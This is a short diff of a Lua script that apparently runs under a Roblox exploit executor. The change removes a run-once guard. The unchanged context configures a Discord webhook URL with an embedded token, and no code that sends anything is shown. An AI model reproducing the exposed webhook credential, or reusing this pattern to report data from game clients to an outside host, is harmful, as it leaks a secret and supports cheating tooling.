@@ -1,9 +1,6 @@
 repeat task.wait() until game:IsLoaded()
 task.wait(2)
 
-_G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then return end
-_G.scriptExecuted = true
 
 local cfg = (getgenv and getgenv()) or {}
 cfg.webhook      = "https://discord.com/api/webhooks/1477452813721276542/frqTKTAzpn-pNV1z3PKcg0EOFZyM1CMqRDFfBXZ55f1t2gsAZLtJfQHPBfZmPWWhwigA"
